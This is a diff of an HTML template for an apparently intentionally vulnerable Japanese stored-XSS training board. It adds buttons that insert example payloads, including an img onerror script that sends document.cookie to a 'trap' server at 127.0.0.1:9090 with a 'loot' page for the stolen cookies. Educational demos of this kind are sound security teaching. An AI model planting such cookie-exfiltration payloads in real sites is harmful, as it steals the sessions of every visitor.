@@ -3,17 +3,22 @@
 <p>誰でも書き込める掲示板です。投稿内容はDBに保存され、ページを開いた全員に表示されます。</p>
 
 <form method="post" action="/xss/board">
-  <p><label>名前 <input name="name" size="20"></label></p>
-  <p><label>本文<br><textarea name="body" rows="3" cols="50"></textarea></label></p>
+  <p><label>名前 <input id="name" name="name" size="20"></label></p>
+  <p><label>本文<br><textarea id="body" name="body" rows="3" cols="50"></textarea></label></p>
   <p><button type="submit">投稿</button></p>
 </form>
 
-<h2>ワンクリックで試す</h2>
-<form method="post" action="/xss/board" style="display:inline">
-  <input type="hidden" name="name" value="攻撃者">
-  <input type="hidden" name="body" value="<script>alert('stored: ' + document.cookie)</script>">
-  <button class="btn" type="submit">スクリプトを投稿する</button>
-</form>
+<h2>入力例を入れる</h2>
+<p><small>ボタンを押すと上の欄に入力例が入ります。送信ボタンを押すと実行されます。</small></p>
+<button type="button" class="btn" onclick="document.getElementById('name').value = '攻撃者'; document.getElementById('body').value = '<script>alert(\'stored: \' + document.cookie)</script>'">スクリプトを入力する</button>
+<button type="button" class="btn" onclick="document.getElementById('name').value = '攻撃者'; document.getElementById('body').value = '<img src=x onerror=&quot;new Image().src=\'http://127.0.0.1:9090/xss/steal?c=\' + encodeURIComponent(document.cookie)&quot;>'">Cookieを攻撃者サーバーへ送る</button>
+
+<h2>攻撃を試す</h2>
+<p>戦利品ページ(別ポート 9090 = 別オリジン)を別タブで開いたまま、上の「Cookieを攻撃者サーバーへ送る」を投稿し、この掲示板を開き直してください。罠サーバーは別途起動が必要です(<code>cd trap &amp;&amp; go run .</code>)。</p>
+<ul>
+  <li><a href="http://127.0.0.1:9090/xss/loot" target="_blank" rel="noopener">戦利品ページ</a>: 盗み出された Cookie が表示されます(3秒ごとに自動更新)。</li>
+</ul>
+<p><small>反射型と違い、リンクを踏ませる必要はありません。この掲示板を開いた人全員の Cookie が送られます。</small></p>
 
 <h2>投稿一覧</h2>
 {{range .Comments}}
